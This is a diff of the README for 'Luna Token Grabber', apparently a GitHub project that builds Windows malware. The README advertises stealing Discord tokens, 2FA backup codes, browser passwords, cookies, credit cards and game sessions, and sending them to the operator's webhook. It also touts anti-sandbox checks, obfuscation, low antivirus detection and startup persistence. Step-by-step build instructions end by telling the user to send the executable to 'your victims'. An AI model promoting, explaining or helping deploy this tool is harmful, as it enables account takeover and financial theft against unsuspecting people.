@@ -1,102 +1,106 @@
 <h1 align="center">
-  Luna Token Grabber😈
+  Luna Token Grabber
 </h1>
 
-<h2 align="center">
-  Luna Token Grabber is a tool that steals discord tokens and other information and sends it to your webhook!
-</h2>
-
 <div align="center">
-  <img src="https://img.shields.io/github/last-commit/Smug246/Luna-Grabber-Builder?color=6d00c1&&?style=flat-square">
-  <img src="https://sonarcloud.io/api/project_badges/measure?color=6d00c1&project=Smug246_Luna-Grabber-Builder&metric=ncloc">
-  <img src="https://img.shields.io/github/stars/Smug246/Luna-Grabber-Builder?color=6d00c1&label=Stars&style=flat-square">
-  <img src="https://img.shields.io/github/forks/Smug246/Luna-Grabber-Builder?color=6d00c1&label=Forks&style=flat-square">
- 
+  <img  src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
   <br>
+  <img  src="https://img.shields.io/github/languages/top/Smug246/Luna-Token-Grabber?color=6d00c1">
+  <img  src="https://img.shields.io/github/stars/Smug246/Luna-Token-Grabber?color=6d00c1&logoColor=6d00c1">
   <br>
-  <img src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
-  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+  <img  src="https://img.shields.io/github/commit-activity/w/Smug246/Luna-Token-Grabber?color=6d00c1">
+  <img  src="https://img.shields.io/github/last-commit/Smug246/Luna-Token-Grabber?color=6d00c1&logoColor=6d00c1">
+  <br>
+  <img  src="https://img.shields.io/github/issues/Smug246/Luna-Token-Grabber?color=6d00c1&logoColor=6d00c1">
+  <img  src="https://img.shields.io/github/issues-closed/Smug246/Luna-Token-Grabber?color=6d00c1&logoColor=6d00c1">
+  <hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
 </div>
+
+## Features
+
+- Discord Info
+    - Token
+    - Nitro
+    - Billing
+    - 2FA 
+    - Email
+    - Phone
+    - Gift Codes
+    - Backup Codes
+
+- Browser Data
+    - Cookies
+    - Passwords
+    - History
+    - Credit/Debit Cards
+
+- Game Data
+	- Minecraft Session Info
+	- Roblox Cookie & Other Data
+
+- Discord Injection
+    - Sends token, password & email on user login or when user changes password
+
+- System info
+    - User
+    - OS
+    - System
+    - Network IP
+    - Wifi
+    - Mac
+    - Hwid
+    - PC Specs
+    - Screenshot
+
+- Grabber Functions
+    - Checks if being run in a virustotal sandbox/virtual machine
+    - Checks for blacklisted users, pc names, HWIDs, IPs, MACs and Processes
+    - Adds file to startup
+    - Anti Spam
+    - Fake Error
+    - Obfuscation
+    - Icon (optional)
+    - Low Detections
+    - Bypass Token Protector
+ 
+<hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
   
-### Features:
+## Installation
 
-- `Discord Token`🟢
-- `Browser Passwords`🟢
-- `Browser Cookies`🟢
-- `Browser History`🟢
-- `Roblox Info`🟢
-- `Credit Cards`🟢
-- `IP`🟢
-- `Phone Number`🟢
-- `Email`🟢
-- `Discord Injection`🟢
-- `Wifi Passwords`🟢
-- `Minecraft Session Info`🟢
-- `2FA Enabled Or Not`🟢
-- `Gift Inventory Codes`🟢
-- `Discord Backup Codes`🟢
-- `If They Have Nitro`🟢
-- `What OS They're Using`🟢
-- `RAM`🟢
-- `GPU`🟢
-- `CPU`🟢
-- `Fake Error`🟢
-- `Obfuscation`🟢
-- `Condensed .Exe Size`🟢
-- `Icon For .Exe (optional)`🟢
-- `Add File To Startup`🟢
-- `Anti Spam (just prevents from multiple instances running at once)`🟢
-- `Very Low Detections`🟢
-- `Bypass Token Protector`🟢
-- `WebCam Screenshot (optional)`🟡
-- `Binder`🟡
+### 1. Download Python:
 
-🟢 = Added | 🟡 = To Do | 🔴 = Not Adding
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-## Setup
-
-Make sure you have [Python](https://www.python.org/downloads/) installed and it is added to your [Path](https://youtu.be/Y2q_b4ugPWk)
-
-```sh-session
-python v3.10.1 or higher
 ```
-
+Make sure you have Python installed and it is added to your path.
+```
 ### 1. Download The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-
 ### 2. Open The build.bat File:
 
 ```
 You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will
 open a terminal with the luna logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
 ```
-
 ### 3. Create A Webhook:
 
 ```
 This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
 into the terminal when prompted.
 ```
-
 ### 4. Configurable Options:
 
 ```
 Now once you've given your file a name you can pick between some options by typing either y or n for each one. After
 having done that the file will be built and ready for usage.
 ```
-
 ### 5. Test The File:
 
 ```
 You will then be promtped as to whether you want to run the file or not. I recommend this so you
 can see if there are any issues or not.
 ```
-
 ### 6. What Now?
 
 ```
@@ -104,25 +108,13 @@ The .exe file will appear in the same folder where all the other files are with 
 this to your victims.😈
 ```
 
-> Still don't quite understand how to set it up? Make an issue or [Click me!](https://discord.gg/qqHM44c55h)
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
+<hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
+  
 ### GUI
 
 ![discord](https://i.imgur.com/c1cUmZF.png)
 ![discord2](https://i.imgur.com/zReVojP.png)
-![files](https://i.imgur.com/UV5SuC2.png)
+![discord3](https://i.imgur.com/9u8nNbD.png)
+![discord4](https://i.imgur.com/6GO5CB4.png)
 ![injection](https://i.imgur.com/4DNCiAJ.png)
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-### Inspiration/Credits
-
-Luna Token Grabber has some contributions from Addidix and Rdimo. Credit where due goes to them.
-Any code to do with the injection is from [rdimo's injection](https://github.com/Rdimo/Discord-Injection)
-Make sure you check that out when you get the chance!
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-## If you enjoyed this project consider dropping a star!
+![files](https://i.imgur.com/Kx4F4cr.png)
